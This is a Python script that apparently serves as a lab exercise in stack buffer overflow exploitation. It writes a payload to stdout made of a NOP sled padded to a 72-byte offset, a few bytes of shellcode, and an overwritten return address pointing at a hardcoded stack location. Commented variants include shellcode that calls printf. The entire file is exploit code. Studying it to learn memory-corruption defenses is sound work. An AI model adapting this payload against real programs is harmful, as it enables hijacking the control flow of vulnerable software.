import sys

def int2bytes(i, enc):
    return i.to_bytes((i.bit_length() + 7) // 8, enc)

def convert_hex(str, enc1, enc2):
    return int2bytes(int.from_bytes(bytes.fromhex(str), enc1), enc2).hex()

# buffer + rbp
rip_offset = 64 + 8
shell_code = "b8bbcd80"
# shell_code = "be999999994889c7e808feffff"
# shell_code = ""

# shell_code  = b'\xbe\x99\x99\x99\x99'           # mov    $0x99999999,%esi
# shell_code += b'\x48\x89\xc7'                   # mov    %rax,%rdi
# shell_code += b'\xe8\x08\xfe\xff\xff'           # call   1040 <printf@plt>

filler_bytes = ""
for i in range(0, rip_offset-int(len(shell_code)/2)):
    filler_bytes += "90"

return_addr = "7fffffffdf10"
# return_addr = "000055555555522b"

# shell_code = convert_hex(shell_code, 'big', 'little')
# return_addr = convert_hex(return_addr, 'big', 'little')

sys.stdout.buffer.write(bytes.fromhex(filler_bytes) + bytes.fromhex(shell_code)[::-1] + bytes.fromhex(return_addr)[::-1])
